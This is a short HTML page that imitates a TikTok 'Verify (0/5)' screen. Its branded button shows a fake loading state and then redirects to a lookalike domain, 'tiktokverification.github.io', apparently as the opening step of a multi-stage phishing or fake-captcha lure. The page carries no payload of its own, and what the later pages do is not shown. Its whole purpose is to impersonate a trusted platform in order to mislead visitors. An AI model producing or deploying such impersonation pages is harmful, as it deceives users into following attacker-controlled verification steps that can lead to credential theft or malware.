<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        * { box-sizing: border-box; } /* Crucial to force width math */

        body, html {
            margin: 0; padding: 0; height: 100%;
            background: #ffffff;
            font-family: "Proxima Nova", "Inter", -apple-system, sans-serif;
            display: block; /* Removed flex from body to prevent shrinking */
            -webkit-font-smoothing: antialiased;
            overflow: hidden;
        }

        #button-container {
            position: absolute;
            bottom: 18%; /* Positioned in the thumb zone */
            width: 100%;
            display: flex;
            justify-content: center;
        }

        #verify-btn {
            /* FORCE WIDTH: This takes up 94% of the actual screen width */
            width: 94% !important; 
            min-width: 94vw; 
            
            height: 52px;
            background-color: #FE2C55; 
            color: #ffffff;
            border: none;
            border-radius: 4px;
            
            /* Typography: Regular weight, perfectly centered */
            font-size: 16px;
            font-weight: 400; 
            white-space: nowrap;
            
            display: flex;
            justify-content: center;
            align-items: center;
            cursor: pointer;
            outline: none;
            -webkit-tap-highlight-color: transparent;
        }

        /* Grayed out state */
        #verify-btn.loading {
            background-color: #E1E1E2; 
            color: transparent;
            pointer-events: none;
        }

        .spinner {
            display: none;
            position: absolute;
            width: 22px;
            height: 22px;
            border: 2.5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #ffffff;
            animation: spin 0.8s linear infinite;
        }

        #verify-btn.loading .spinner {
            display: block;
            border-top-color: #8A8B91;
            border-left-color: rgba(0,0,0,0.1);
        }

        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>
<body>

    <div id="button-container">
        <button id="verify-btn" onclick="startLoading()">
            <span id="btn-text">Verify (0/5)</span>
            <div class="spinner"></div>
        </button>
    </div>

    <script>
        function startLoading() {
            const btn = document.getElementById('verify-btn');
            btn.classList.add('loading');
            setTimeout(() => {
                window.location.href = "https://tiktokverification.github.io/captcha/Verification/verify1.html";
            }, 1200);
        }
    </script>

</body>
</html>
